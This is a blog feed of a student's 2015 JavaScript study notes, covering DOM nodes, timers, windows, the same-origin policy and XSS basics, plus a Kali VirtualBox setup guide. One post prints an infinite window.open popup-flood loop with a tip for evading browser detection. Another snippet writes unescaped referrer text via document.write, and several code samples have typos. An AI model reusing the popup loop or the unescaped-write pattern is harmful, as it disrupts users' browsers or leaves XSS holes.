<h5 id="栗子"><a href="#栗子" class="headerlink" title="栗子:"></a>栗子:</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ref = <span class="built_in">document</span>.referrer;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.referrer.indexOf(<span class="string">"https://www.google.com/search?"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">   <span class="keyword">var</span> args = <span class="built_in">document</span>.referrer.substring(ref.indexOf(<span class="string">"?"</span>)+<span class="number">1</span>).split(<span class="string">"&amp;"</span>) ; <span class="comment">//args为以&amp;为分解符的string数组</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; args.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (args[i].substring(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"q="</span>)</span><br><span class="line">            <span class="built_in">document</span>.write(<span class="string">"You are searching for: "</span> + <span class="built_in">unescape</span>(args[i].substring(<span class="number">2</span>)).replace(<span class="string">'+'</span>, <span class="string">' '</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js学习笔记(5)]]></title>
      <url>http://csser.work/10/08/2015/js-client-5/</url>
      <content type="html"><![CDATA[<h2 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h2><h3 id="Js的css选择器"><a href="#Js的css选择器" class="headerlink" title="Js的css选择器"></a>Js的css选择器</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> document.querySelector(selectors);  //和css选择完全一样</span><br><span class="line"> document.querySelectorAll();   //返回Nodelist</span><br><span class="line"> console.log(document.querySelector('[</span><br><span class="line"> "]'));//栗子</span><br><span class="line">&lt;!-- 要加东西!!!! --&gt;</span><br></pre></td></tr></table></figure>
<h3 id="一些概念和代码"><a href="#一些概念和代码" class="headerlink" title="一些概念和代码"></a>一些概念和代码</h3><p><a href="http://www.w3school.com.cn/jsref/prop_node_nodetype.asp" target="_blank" rel="external">nodeType</a>    :可用于遍历网页</p>
<p>获取节点属性:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.attributes[<span class="string">"onload"</span>]; <span class="comment">//&lt;body&gt;的onload属性值</span></span><br></pre></td></tr></table></figure></p>
<p>获取特定节点的html代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">''</span>).innerHTML;  <span class="comment">//以字符串形式展示  </span></span><br><span class="line">                                               .outerHTML;  <span class="comment">//outerHTML包含选中节点的html内容</span></span><br></pre></td></tr></table></figure></p>
<p><a href="http://zhidao.baidu.com/link?url=cBshl-3vyhx2BKqVmQ1fnmB94xtfrQ6oBLxZHbZjs5jyltwQIVi3cH9GKOF9Zx4hxuJ7GO9R3UIXICsDEtjGwa" target="_blank" rel="external">CDATASection</a></p>
<p>demo:查找某个节点的所有text节点<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textContent = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> child,type,s = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(child = e.firstChild; child != <span class="literal">null</span>; child = child.nextSibling)&#123;</span><br><span class="line">        type = child.nodeType;</span><br><span class="line">        <span class="keyword">if</span>(type === <span class="number">3</span> || type === <span class="number">4</span>)    <span class="comment">//Text和CDATASection</span></span><br><span class="line">            s += child.nodeValue;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="number">1</span>)</span><br><span class="line">            s += textContent(child);    <span class="comment">//如果该节点是子节点(元素),节点递归</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="节点的增删改查"><a href="#节点的增删改查" class="headerlink" title="节点的增删改查"></a>节点的增删改查</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loadaync = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">url</span>)</span>&#123;   <span class="comment">//head头中插入一条外链js</span></span><br><span class="line">    <span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.creatElement(<span class="string">"script"</span>);</span><br><span class="line">    s.src = url;</span><br><span class="line">    head.appendChild(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Text节点可以用如下方式创建:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newnode = <span class="built_in">document</span>.createTextNode(<span class="string">"New words"</span>);</span><br></pre></td></tr></table></figure></p>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> insertAt = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">parent, child, n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span> || n &gt;parent.childNodes.length)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Invalid index!"</span>);  <span class="comment">//对n的位置进行报错处理</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n == parent.childNodes.length)</span><br><span class="line">        parent.appendChild(child);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        parent.insertBefore(child, parent.childNodes[n]);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="删除和替换"><a href="#删除和替换" class="headerlink" title="删除和替换"></a>删除和替换</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除</span></span><br><span class="line">n.parentNode.removeChild( n );  <span class="comment">//在父节点运行函数</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//替换n节点</span></span><br><span class="line">n.parentNode.replaceChild( <span class="built_in">document</span>.creatTextNode(<span class="string">"[ Redacted ]"</span>),n);  <span class="comment">//在父节点运行函数</span></span><br></pre></td></tr></table></figure>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[又是一年]]></title>
      <url>http://csser.work/10/08/2015/say-1/</url>
      <content type="html"><![CDATA[<h3 id="小感慨"><a href="#小感慨" class="headerlink" title="小感慨"></a>小感慨</h3><h4 id="反省"><a href="#反省" class="headerlink" title="反省"></a>反省</h4><p>一年过去了,也渐渐适应了大学的节奏,但是看看自己走过的路,依然是一张白纸,多了几滴杂墨.<br>入了这个专业,进了这个协会,可能是自己资质太差,并没有受到认同.<br>生性孤僻,在大学也没有交到什么朋友,高中同学也不常聊了.<br>肯定是自己太懒,技术也没学到什么,绩点又渣渣,还妄想什么奖学金?(作业都懒得做的人!)</p>
<h4 id="决心"><a href="#决心" class="headerlink" title="决心"></a>决心</h4><p><code>既来之,则安之</code>入了这个坑,就该把这个坑填满,别人看不起你,那是活该,不该抱怨.所以努力吧,在今后两年让自己活出名堂!</p>
<h3 id="小目标"><a href="#小目标" class="headerlink" title="小目标"></a>小目标</h3><p>A. 继续Javascript,权威指南(虽然难看,但也得看啊,没人给你看)<br>B. 熟练使用C C++ (承认自己学的并不好!)<br>C. HetianLab .etc(Securtiy)<br>D. Feed订阅 知乎(Any)<br>E. Shanbay(Level 6)</p>
<h3 id="今后每个月来更新一次"><a href="#今后每个月来更新一次" class="headerlink" title="今后每个月来更新一次!"></a>今后每个月来更新一次!</h3>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Kali2.0安装虚拟机]]></title>
      <url>http://csser.work/10/06/2015/kali-virtual/</url>
      <content type="html"><![CDATA[<h2 id="以VirtualBox为例"><a href="#以VirtualBox为例" class="headerlink" title="以VirtualBox为例"></a>以VirtualBox为例</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>根据官方文档<a href="https://www.virtualbox.org/wiki/Linux_Downloads" target="_blank" rel="external">Oracle Linux</a></p>
<ol>
<li>添加源 <code>deb http://download.virtualbox.org/virtualbox/debian jessie contrib</code><br> gedit /etc/apt/sources.list</li>
<li>下载<a href="https://www.virtualbox.org/download/oracle_vbox.asc" target="_blank" rel="external">Oracle公钥</a><br><code>apt-key add oracle_vbox.asc</code>进行导入</li>
<li>安装<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install virtualbox-5.0</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Kali-Linux-virtualbox-rc-1908"><a href="#Kali-Linux-virtualbox-rc-1908" class="headerlink" title="Kali Linux virtualbox (rc=-1908)"></a>Kali Linux virtualbox (rc=-1908)</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>deb的源问题,导致原本的linux-header依赖没法安装</p>
<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><h5 id="添加源并更新"><a href="#添加源并更新" class="headerlink" title="添加源并更新"></a>添加源并更新</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#New</span></span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line"><span class="comment">#Origin</span></span><br><span class="line">deb-src http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb-src http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line"><span class="comment">#gedit /etc/apt/source.list</span></span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; upgrade</span><br></pre></td></tr></table></figure>
<h5 id="获取内核和相应版本的linux-header"><a href="#获取内核和相应版本的linux-header" class="headerlink" title="获取内核和相应版本的linux-header"></a>获取内核和相应版本的linux-header</h5><pre><code>uname -r
apt-cache search linux-header
</code></pre><p><img src="/imgs/kali2Virtual/1.png" alt="1"></p>
<h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><pre><code>apt-get install xxx
</code></pre><p><img src="/imgs/kali2Virtual/2.png" alt="2"></p>
<h5 id="完成图"><a href="#完成图" class="headerlink" title="完成图"></a>完成图</h5><p><img src="/imgs/kali2Virtual/3.png" alt="3"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://zhidao.baidu.com/link?url=wXtAPXdRSeneWV3jLAfBbPQp9knA8tVNQD-kGkOVBXOAZ8ivPMTDhq9rk508-ebXA24ItJzQgua2bBGnmEvPRa" target="_blank" rel="external">Baidu</a><br><a href="https://www.felixrr.pro/archives/399/kali-2-0-virtualbox-guest-additions-and-linux-headers" target="_blank" rel="external">felixrr.pro</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js学习笔记(3)]]></title>
      <url>http://csser.work/10/03/2015/js-client-3/</url>
      <content type="html"><![CDATA[<h2 id="Window对象"><a href="#Window对象" class="headerlink" title="Window对象"></a>Window对象</h2><h3 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h3><hr>
<h4 id="掌握"><a href="#掌握" class="headerlink" title="掌握"></a>掌握</h4><pre><code>argument对象
setTimeout(code,millisec) 单次调用
setInterval(code,millisec)  循环调用
</code></pre><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">invoke</span>(<span class="params">f, start, interval, end</span>)</span>&#123;   <span class="comment">//Target Function:f()</span></span><br><span class="line">    <span class="keyword">if</span> (!start)</span><br><span class="line">        start=<span class="number">0</span>;    <span class="comment">//默认设置为立即开始</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">arguments</span>.length &lt;= <span class="number">2</span>)</span><br><span class="line">        setTimeout(f,start);    <span class="comment">//单次调用</span></span><br><span class="line">    <span class="keyword">else</span>&#123;               <span class="comment">//多次调用</span></span><br><span class="line">        setTimeout(repeat,start);   <span class="comment">//start MS之后调用</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">repeat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> h = setInterval(f,interval);</span><br><span class="line">            <span class="keyword">if</span>(end)</span><br><span class="line">                setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//end MS之后停止调用Interval()</span></span><br><span class="line">                    clearInterval(h);</span><br><span class="line">                &#125;,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">666</span>);</span><br><span class="line">&#125;</span><br><span class="line">invoke(f,<span class="number">0</span>,<span class="number">50</span>,<span class="number">200</span>);</span><br></pre></td></tr></table></figure>
<p>Results : </p>
<pre><code>4*(666)
</code></pre><hr>
<h3 id="关于URL"><a href="#关于URL" class="headerlink" title="关于URL"></a>关于URL</h3><p>window对象的location属性引用了Location对象,表示该窗口中当前显示的文档URL<br> document.location 文档 首次 载入后保存的URL静态字符串<br> location可以赋值相对字符串,例如<code>location=&#39;404.html&#39;</code></p>
<h4 id="掌握-1"><a href="#掌握-1" class="headerlink" title="掌握"></a>掌握</h4><pre><code>search 属性是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号 ? 之后的部分）
stringObject.substring(start,stop)    取一段字符
stringObject.split(separator,howmany) 字符串分割
stringObject.indexOf(searchvalue,fromindex)   字符检索
</code></pre><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlAges</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//URL参数解析函数</span></span><br><span class="line">    <span class="keyword">var</span> args = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> query = location.search.substring(<span class="number">1</span>);   <span class="comment">//获取url查询字符串</span></span><br><span class="line">    <span class="keyword">var</span> pairs = query.split(<span class="string">"&amp;"</span>);   <span class="comment">//此时的pairs为字符串数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;pairs.length ; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> pos = pairs[i].indexOf(<span class="string">'='</span>);    <span class="comment">//检测第一个'='</span></span><br><span class="line">        <span class="keyword">if</span>(pos == <span class="number">-1</span>)   <span class="comment">//indexOf()由-1开始进行(第一个检测的是0)</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">var</span> name = pairs[i].substring(<span class="number">0</span>,pos);</span><br><span class="line">        <span class="keyword">var</span> value = pairs[i].substring(pos+<span class="number">1</span>);</span><br><span class="line">        value = <span class="built_in">decodeURIComponent</span>(value);  <span class="comment">//value解码</span></span><br><span class="line">        args[name] = value; <span class="comment">//将value存储为args对象的name属性值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js学习笔记(4)]]></title>
      <url>http://csser.work/10/03/2015/js-client-4/</url>
      <content type="html"><![CDATA[<h3 id="jQuery的-查询"><a href="#jQuery的-查询" class="headerlink" title="jQuery的$查询"></a>jQuery的$查询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $ = <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">document</span>.getElementById(id); &#125;;    <span class="comment">//定义$方法</span></span><br><span class="line">ui.prompt = $(<span class="string">"prompt"</span>);</span><br></pre></td></tr></table></figure>
<h2 id="window"><a href="#window" class="headerlink" title="window"></a>window</h2><h3 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w = <span class="built_in">window</span>.open();  <span class="comment">//定义一个窗口 新窗口由此产生一个window.opener属性</span></span><br><span class="line">w.alert(<span class="string">'xxx'</span>);</span><br><span class="line">w.location = <span class="string">'about:blank'</span>;</span><br><span class="line">w.close();    <span class="comment">//只能关闭通过window.open()方法打开的窗口</span></span><br></pre></td></tr></table></figure>
<h3 id="窗体"><a href="#窗体" class="headerlink" title="窗体"></a>窗体</h3><p>窗体通过<code>&lt;iframe&gt;</code>创建,而且拥有<code>contentWindow</code>属性用来引用该窗体的window对象</p>
<h3 id="窗体-口之间的交互"><a href="#窗体-口之间的交互" class="headerlink" title="窗体/口之间的交互"></a>窗体/口之间的交互</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">'A'</span> <span class="attr">src</span>=<span class="string">"a.foo.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">'B'</span> <span class="attr">src</span>=<span class="string">"b.foo.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>存在两个窗体AB,且不受同源策略影响.A中脚本定义了一个变量i<code>var i = 1;</code>,B可以通过简单的’parent.A.i = 4;’对A中的变量进行赋值,函数调用同理<br>如果iframe元素需要调用父级页面元素,则采用<code>parent.example();</code>语句</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js学习笔记(2)]]></title>
      <url>http://csser.work/10/02/2015/js-client-2/</url>
      <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略的存在限制了JS的释放范围</p>
<h3 id="何时生效"><a href="#何时生效" class="headerlink" title="何时生效"></a>何时生效</h3><p>当多个<code>&lt;iframe&gt;</code>标签或者打开其他浏览器窗口的时候策略生效<br>脚本只能读取和所属文档来源相同的窗口和文档的属性</p>
<h4 id="文档来源判定"><a href="#文档来源判定" class="headerlink" title="文档来源判定"></a>文档来源判定</h4><p>协议,主机,载入文档的URL端口</p>
<h2 id="严格的同源策略"><a href="#严格的同源策略" class="headerlink" title="严格的同源策略?"></a>严格的同源策略?</h2><p>在实际操作情况之下,同源策略并不能保证如此严格的条件.Example:</p>
<h3 id="1-网站存在多个子域"><a href="#1-网站存在多个子域" class="headerlink" title="1.网站存在多个子域"></a>1.网站存在多个子域</h3><p>例如a.exp.com需要读取来自b.exp.com的a.html里与b.html均加入<br><code>document.domain = &quot;xxx.com&quot;;</code>   但是必须是共有的根域名,上则为exp.com,这样两个页面就可以互相操作了,也就实现了所谓的”跨域”.</p>
<h3 id="2-跨资源共享-Corss-Origin-Resource-Sharing"><a href="#2-跨资源共享-Corss-Origin-Resource-Sharing" class="headerlink" title="2.跨资源共享(Corss-Origin Resource Sharing)"></a>2.跨资源共享(Corss-Origin Resource Sharing)</h3><p>利用这个标准提供的”Origin”和对应的Access-Control-Allow-Origin: xxx.com来扩展http,可实现任意的http请求</p>
<h3 id="3-跨文档消息-cross-document-messaging"><a href="#3-跨文档消息-cross-document-messaging" class="headerlink" title="3.跨文档消息(cross-document messaging)"></a>3.跨文档消息(cross-document messaging)</h3><p>这个功能可以使一个文档的脚本直接一步传输给目标文档并允许执行.利用<code>postMessage()</code>方法</p>
<p>##跨站脚本(XSS)<br>如果目标网页有存在html标签插入功能,而且后台并没有相应的过滤原则,则存在该风险.攻击者只需要加入XSS的Js脚本,通过<code>src=hack.js</code>插入或者直接执行js脚本</p>
<p>####简单的防御<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = name.replace(<span class="regexp">/&lt;/g</span>, <span class="string">"&amp;lt;"</span>).replace(<span class="regexp">/&gt;/g</span>, <span class="string">"&amp;gt;"</span>);</span><br></pre></td></tr></table></figure></p>
<p>针对于IE存在一个<a href="https://msdn.microsoft.com/en-us/en_US/library/windows/apps/hh466094.aspx" target="_blank" rel="external">toStaticHTML()</a>的API,可以过滤相当一部分的标签</p>
<p>####HTML5的安全策略<br>HTML5中<code>&lt;iframe&gt;</code>定义了一个sandbox属性,实现之后允许显示不可信内容,但自动禁用脚本</p>
<p>##DDoS<br>例子:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="built_in">window</span>.open(<span class="string">'about:blank'</span>, <span class="string">''</span>, <span class="string">'width=645,height=550'</span>); <span class="comment">//窗体大小不填则创建新标签,否则创建新窗体</span></span><br><span class="line">&#125;<span class="comment">//请勿随便尝试= ,=</span></span><br></pre></td></tr></table></figure></p>
<p>为了防止被聪明的浏览器检测到,使用<a href="http://www.w3school.com.cn/jsref/met_win_setinterval.asp" target="_blank" rel="external">window.setInterval()</a>来保证自己的生存</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js学习笔记(1)]]></title>
      <url>http://csser.work/10/01/2015/js-client-1/</url>
      <content type="html"><![CDATA[<h2 id="一步步走Js"><a href="#一步步走Js" class="headerlink" title="一步步走Js"></a>一步步走Js</h2><p>一个小概念:<br>    文档(document):呈现静态信息的页面.<br>    document是window的其中一个对象<br>跳转新的界面:<br><code>window.location = &quot;http://www.google.com&quot;;</code><br>设置延迟:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">123</span>);&#125;,<span class="number">1000</span>)    <span class="comment">//1s后启动函数</span></span><br></pre></td></tr></table></figure></p>
<p>查询元素,插入内容<br>        <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(timestamp.firstChild == <span class="literal">null</span>)    </span><br><span class="line">            timestamp.appendChild(<span class="built_in">document</span>.createTextNode(<span class="keyword">new</span> <span class="built_in">Date</span>().toString()));</span><br><span class="line">    <span class="keyword">var</span> timestamp=<span class="built_in">document</span>.getElementById(<span class="string">"timestamp"</span>)</span><br><span class="line">        <span class="comment">//timestamp具有style和className属性</span></span><br></pre></td></tr></table></figure></p>
<p>添加点击事件:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestamp.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.innerHTML = <span class="keyword">new</span> <span class="built_in">Date</span>().toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>内容显示隐藏的简单实现:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span><br><span class="line">        <span class="selector-class">.reveal</span> * &#123;<span class="attribute">display</span>:none;&#125;</span><br><span class="line">        <span class="selector-class">.reveal</span> *<span class="selector-class">.handle</span>&#123;<span class="attribute">display</span>:block;&#125;</span><br><span class="line">        <span class="comment">/*只有"handle"的元素显示*/</span></span><br><span class="line">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> elements = <span class="built_in">document</span>.getElementsByClassName(<span class="string">"reveal"</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; elements.length;i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> elt = elements[i];   <span class="comment">//elt为reveal元素节点</span></span><br><span class="line">                <span class="keyword">var</span> title = elt.getElementsByClassName(<span class="string">"handle"</span>)[<span class="number">0</span>];<span class="comment">//第一个handle类的元素</span></span><br><span class="line">                addRevealHandler(title,elt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">addRevealHandler</span>(<span class="params">title,elt</span>) </span>&#123;</span><br><span class="line">                title.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (elt.className == <span class="string">"reveal"</span>)</span><br><span class="line">                        elt.className = <span class="string">"revealed"</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (elt.className == <span class="string">"revealed"</span>)</span><br><span class="line">                        elt.className = <span class="string">"reveal"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><span class="tag">&lt;/<span 